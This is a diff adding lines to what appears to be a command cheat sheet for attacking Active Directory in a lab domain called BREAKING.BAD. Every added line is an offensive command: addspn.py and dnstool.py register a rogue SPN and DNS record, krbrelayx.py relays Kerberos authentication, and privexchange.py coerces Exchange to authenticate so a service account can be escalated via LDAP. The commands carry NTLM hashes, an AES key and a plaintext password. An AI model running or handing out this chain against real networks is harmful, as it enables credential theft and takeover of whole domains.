@@ -146,3 +146,10 @@ cme ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasti
 crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
 crackmapexec ldap 192.168.56.0/24 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
 ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
+addspn.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
+dnstool.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
+krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
+addspn.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -t SV01 -s HTTP/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
+dnstool.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
+privexchange.py -u serviceaccount -p P4ssw0rd -ah SHUTDOWN.BREAKING.BAD EXCHANGE.BREAKING.BAD -d BREAKING.BAD
+krbrelayx.py --krbpass P4ssw0rd --krbsalt BREAKING.BADSV01 -t ldap://dc01.breaking.bad --escalate-user serviceaccount
